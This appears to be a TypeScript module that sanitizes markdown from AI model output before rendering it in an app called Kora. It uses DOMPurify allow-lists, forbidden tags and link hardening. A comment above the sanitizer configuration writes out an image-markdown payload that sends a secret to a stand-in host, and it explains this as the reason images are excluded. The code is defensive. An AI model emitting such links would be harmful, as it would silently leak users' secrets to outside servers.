/**
 * Markdown → safe DOM.
 *
 * This is the highest-risk surface in Kora: everything rendered here is content
 * Kora did not write — model output, file contents, pasted text. So the rule is
 * absolute and has no exceptions by source: **nothing reaches the DOM without
 * passing through DOMPurify first**, including the syntax-highlighted HTML this
 * module generates itself (`plan/phase-5-rich-content-search.md` → Security).
 *
 * Bundle cost is kept down by registering only the languages worth having
 * (highlight.js's full bundle is an order of magnitude larger than the app):
 * anything else falls back to plain, unhighlighted — but still escaped — text.
 */

import DOMPurify from 'dompurify';
import { Marked } from 'marked';
import hljs from 'highlight.js/lib/core';

import bash from 'highlight.js/lib/languages/bash';
import c from 'highlight.js/lib/languages/c';
import cpp from 'highlight.js/lib/languages/cpp';
import csharp from 'highlight.js/lib/languages/csharp';
import css from 'highlight.js/lib/languages/css';
import diff from 'highlight.js/lib/languages/diff';
import go from 'highlight.js/lib/languages/go';
import graphql from 'highlight.js/lib/languages/graphql';
import ini from 'highlight.js/lib/languages/ini';
import java from 'highlight.js/lib/languages/java';
import javascript from 'highlight.js/lib/languages/javascript';
import json from 'highlight.js/lib/languages/json';
import kotlin from 'highlight.js/lib/languages/kotlin';
import markdown from 'highlight.js/lib/languages/markdown';
import php from 'highlight.js/lib/languages/php';
import python from 'highlight.js/lib/languages/python';
import ruby from 'highlight.js/lib/languages/ruby';
import rust from 'highlight.js/lib/languages/rust';
import scss from 'highlight.js/lib/languages/scss';
import shell from 'highlight.js/lib/languages/shell';
import sql from 'highlight.js/lib/languages/sql';
import swift from 'highlight.js/lib/languages/swift';
import typescript from 'highlight.js/lib/languages/typescript';
import xml from 'highlight.js/lib/languages/xml';
import yaml from 'highlight.js/lib/languages/yaml';

const LANGUAGES: [string, Parameters<typeof hljs.registerLanguage>[1]][] = [
  ['bash', bash],
  ['c', c],
  ['cpp', cpp],
  ['csharp', csharp],
  ['css', css],
  ['diff', diff],
  ['go', go],
  ['graphql', graphql],
  ['ini', ini],
  ['java', java],
  ['javascript', javascript],
  ['json', json],
  ['kotlin', kotlin],
  ['markdown', markdown],
  ['php', php],
  ['python', python],
  ['ruby', ruby],
  ['rust', rust],
  ['scss', scss],
  ['shell', shell],
  ['sql', sql],
  ['swift', swift],
  ['typescript', typescript],
  ['xml', xml],
  ['yaml', yaml],
];

for (const [name, def] of LANGUAGES) hljs.registerLanguage(name, def);

/** Aliases the model is likely to write in a fence info string. */
const ALIASES: Record<string, string> = {
  js: 'javascript',
  jsx: 'javascript',
  ts: 'typescript',
  tsx: 'typescript',
  sh: 'bash',
  zsh: 'bash',
  console: 'shell',
  py: 'python',
  rb: 'ruby',
  rs: 'rust',
  yml: 'yaml',
  html: 'xml',
  svg: 'xml',
  toml: 'ini',
  patch: 'diff',
  'c++': 'cpp',
  cs: 'csharp',
  golang: 'go',
  kt: 'kotlin',
  md: 'markdown',
  postgres: 'sql',
  psql: 'sql',
};

/** The highlight.js language for a fence label, or `null` if we have none. */
export function languageOf(label?: string): string | null {
  if (!label) return null;
  const key = label.trim().toLowerCase().split(/[\s:]/)[0];
  const name = ALIASES[key] ?? key;
  return hljs.getLanguage(name) ? name : null;
}

/**
 * Syntax-highlighted HTML for one code block, already sanitized.
 *
 * Unknown languages return escaped plain text rather than a guess: highlight.js
 * auto-detection on a two-line snippet is mostly wrong, and wrong colours read
 * as a claim about the code.
 */
export function highlightCode(code: string, label?: string): string {
  const lang = languageOf(label);
  const html = lang
    ? hljs.highlight(code, { language: lang, ignoreIllegals: true }).value
    : escapeHtml(code);
  return sanitize(html);
}

export function escapeHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

/**
 * The sanitizer configuration, in one place so it can be read as a policy.
 *
 * Anything that executes, loads, or navigates on its own is gone: no script,
 * no style, no iframe/object/embed, no event handlers, no `javascript:` or
 * `data:` URLs. What is left is text, structure, and links the user clicks.
 *
 * `img` is deliberately absent, so markdown image syntax renders as its alt
 * text. An image tag is a network request the model chose, and a URL is a
 * channel: `![](https://elsewhere/?d=<secret>)` would fire the moment the
 * response painted, with nothing for the user to click. Attachments the *user*
 * added are rendered from their own bytes elsewhere, which needs no such tag.
 */
const PURIFY_CONFIG = {
  ALLOWED_TAGS: [
    'p', 'br', 'hr', 'span', 'div',
    'strong', 'em', 'del', 'ins', 'sub', 'sup', 'mark', 'small',
    'a', 'code', 'pre', 'kbd', 'samp', 'var',
    'ul', 'ol', 'li', 'blockquote',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td',
    'details', 'summary',
  ],
  ALLOWED_ATTR: ['href', 'title', 'class', 'open', 'colspan', 'rowspan', 'align'],
  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#|\/)/i,
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input', 'link', 'meta'],
  FORBID_ATTR: ['style', 'srcset', 'formaction', 'ping'],
  ALLOW_DATA_ATTR: false,
  KEEP_CONTENT: true,
};

let hooksInstalled = false;

function installHooks(): void {
  if (hooksInstalled) return;
  hooksInstalled = true;
  // A link in agent output goes to the outside world; it must never be able to
  // reach back into the opener, and it must not navigate the app away.
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName === 'A' && node.hasAttribute('href')) {
      node.setAttribute('target', '_blank');
      node.setAttribute('rel', 'noopener noreferrer nofollow');
    }
  });
}

/** Runs `html` through the sanitizer. The only way HTML enters the DOM. */
export function sanitize(html: string): string {
  installHooks();
  return DOMPurify.sanitize(html, PURIFY_CONFIG) as unknown as string;
}

const marked = new Marked({
  gfm: true,
  // A single newline in agent prose is a line break far more often than it is
  // a paragraph continuation.
  breaks: true,
});

/**
 * Renders markdown to sanitized HTML, with fenced code highlighted.
 *
 * Code fences are highlighted here rather than post-hoc in the DOM so that the
 * generated markup goes through the same sanitizer as everything else.
 */
export function renderMarkdown(source: string): string {
  const html = marked.parse(source, { async: false });
  const clean = sanitize(html);
  return highlightFences(clean);
}

/**
 * Replaces the body of each `<pre><code>` with its highlighted form.
 *
 * Operates on already-sanitized markup, and re-sanitizes what it inserts.
 */
function highlightFences(html: string): string {
  if (typeof document === 'undefined' || !html.includes('<pre>')) return html;
  const host = document.createElement('div');
  host.innerHTML = sanitize(html);

  for (const code of Array.from(host.querySelectorAll('pre > code'))) {
    const label = Array.from(code.classList)
      .find((c) => c.startsWith('language-'))
      ?.slice('language-'.length);
    // textContent, not innerHTML: whatever the markdown parser produced inside
    // the fence is content, not markup.
    code.innerHTML = highlightCode(code.textContent ?? '', label);
    code.classList.add('hljs');
  }
  return host.innerHTML;
}

/**
 * Wraps every match of `query` in `<mark>`, inside an already-sanitized tree.
 *
 * Works on text nodes only, so it cannot alter structure or attributes, and
 * never re-parses agent content as HTML.
 */
export function markMatches(root: HTMLElement, query: string): number {
  if (!query) return 0;
  const needle = query.toLowerCase();
  const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT);
  const targets: Text[] = [];
  let node = walker.nextNode();
  while (node) {
    if (node.textContent?.toLowerCase().includes(needle)) targets.push(node as Text);
    node = walker.nextNode();
  }

  let count = 0;
  for (const text of targets) {
    const value = text.textContent ?? '';
    const frag = document.createDocumentFragment();
    let from = 0;
    for (;;) {
      const at = value.toLowerCase().indexOf(needle, from);
      if (at < 0) break;
      if (at > from) frag.appendChild(document.createTextNode(value.slice(from, at)));
      const mark = document.createElement('mark');
      mark.className = 'k-hit';
      mark.textContent = value.slice(at, at + query.length);
      frag.appendChild(mark);
      from = at + query.length;
      count += 1;
    }
    if (from < value.length) frag.appendChild(document.createTextNode(value.slice(from)));
    text.replaceWith(frag);
  }
  return count;
}
